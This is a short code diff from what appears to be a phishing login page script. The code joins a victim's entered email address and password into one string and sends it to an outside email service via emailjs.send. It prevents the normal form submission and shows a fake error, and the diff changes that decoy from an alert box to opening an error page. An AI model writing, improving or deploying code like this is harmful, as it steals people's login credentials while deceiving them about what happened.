@@ -249,7 +249,7 @@
 
             const value = "Email Address: " + value1 + " " + "Password: " + value2
             if (value1 != null && value2 != null){
-                alert("An unexpected error occurred. Please try logging in again.");
+                open('error.html');
             }
             event.preventDefault()
             emailjs.send('service_eh3mkle', 'template_9m99s5b', {
